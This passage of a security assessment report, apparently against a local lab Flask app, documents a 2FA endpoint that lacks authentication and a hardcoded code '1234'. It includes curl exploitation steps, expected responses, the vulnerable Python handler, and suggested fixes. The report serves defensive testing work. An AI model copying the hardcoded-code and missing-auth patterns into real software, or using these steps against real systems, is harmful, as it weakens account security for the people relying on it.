2. **Hardcoded Bypass Code**: The client-side JavaScript exposes the 2FA verification code `1234` that is hardcoded in the AJAX submission:
```javascript
data: {
    code: 1234,  // User input from form is captured but ignored
},
```

3. **Form Structure**: The OTP form field structure is revealed, enabling targeted reconnaissance

**Technical Details:**

The vulnerability exists because the `/admin/2fa` endpoint (lines 33-44) has no authentication check at the beginning of the route handler:

```python
@app.route('/admin/2fa', methods=['GET', 'POST'])
def two_factor_auth():
    # MISSING: if 'role' not in session: return redirect('/admin/login')
    if request.method == 'POST':
        # ... POST handling
    return render_template('2fa.html')  # Renders without auth check
```

Compare this to protected endpoints like `/admin/dashboard` (lines 114-116) which include proper authentication guards:
```python
@app.route('/admin/dashboard')
def admin_dashboard():
    if 'role' not in session:  # Authentication check present
        return redirect('/')
```

**Notes:**

While this vulnerability alone doesn't grant admin access (the dashboard has its own guards), it provides valuable reconnaissance information:
- Reveals the existence of 2FA in the authentication flow
- Exposes the hardcoded bypass code to anonymous attackers
- Demonstrates inconsistent authentication guard implementation across endpoints
- Could be combined with AUTHZ-VULN-01 or AUTHZ-VULN-02 for complete exploitation chain

---

### AUTHZ-VULN-04: Anonymous 2FA Code Verification

**Summary:**
- **Vulnerable location:** POST /admin/2fa endpoint (app.py:35-43)
- **Overview:** The 2FA code verification endpoint accepts and validates codes from anonymous users without requiring authentication
- **Impact:** Anonymous users can verify the correctness of 2FA codes and receive validation feedback, enabling potential brute-force attacks and confirming the hardcoded bypass code
- **Severity:** MEDIUM

**Prerequisites:** None (anonymous access)

**Exploitation Steps:**

1. Submit the hardcoded 2FA code as an anonymous user (no session cookie):
```bash
curl -i -X POST http://localhost:5003/admin/2fa -d "code=1234"
```

**Expected Response:**
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "",
  "redirect": "",
  "success": true
}
```

2. Verify that incorrect codes are rejected with appropriate feedback:
```bash
curl -i -X POST http://localhost:5003/admin/2fa -d "code=9999"
```

**Expected Response:**
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Invalid code",
  "redirect": "",
  "success": false
}
```

**Proof of Impact:**

Successfully demonstrated that anonymous users can:

1. **Submit verification codes** without any authentication or session
2. **Receive validation feedback** confirming whether codes are correct (`success: true/false`)
3. **Confirm the bypass code** (1234) works by testing it anonymously
4. **Potentially brute-force** the verification code (though it's already exposed in client-side JavaScript per AUTHZ-VULN-03)

While this doesn't directly grant dashboard access (since no admin session exists), it demonstrates:
- Missing authentication guard on POST handler
- Information leakage through success/failure responses
- Potential for automated brute-force attempts without rate limiting
- Inconsistent authentication enforcement across the same endpoint's GET/POST methods

**Technical Details:**

The vulnerability exists because the POST handler at lines 35-43 processes verification codes without checking for an authenticated session:

```python
@app.route('/admin/2fa', methods=['GET', 'POST'])
def two_factor_auth():
    if request.method == 'POST':
        code = request.form['code']  # No auth check before processing
        if code == '1234':  # Hardcoded verification
            return jsonify({"success": True, "message": "", "redirect": ""})
        else:
            return jsonify({"success": False, "message": "Invalid code", "redirect": ""})
    return render_template('2fa.html')
```

The expected secure implementation would:
1. Check for an authenticated session at function entry
2. Verify the session is in a "2FA pending" state
3. Only then process verification codes
4. Implement rate limiting to prevent brute-force attempts

**Notes:**

This vulnerability, combined with AUTHZ-VULN-03 (anonymous page access revealing the hardcoded code), demonstrates a completely broken 2FA implementation. The 2FA mechanism provides zero security value because:
- The code is hardcoded server-side (app.py:38)
- The code is hardcoded client-side (2fa.html:45)
- Anonymous users can discover and verify the code
- The entire 2FA step can be bypassed via AUTHZ-VULN-02
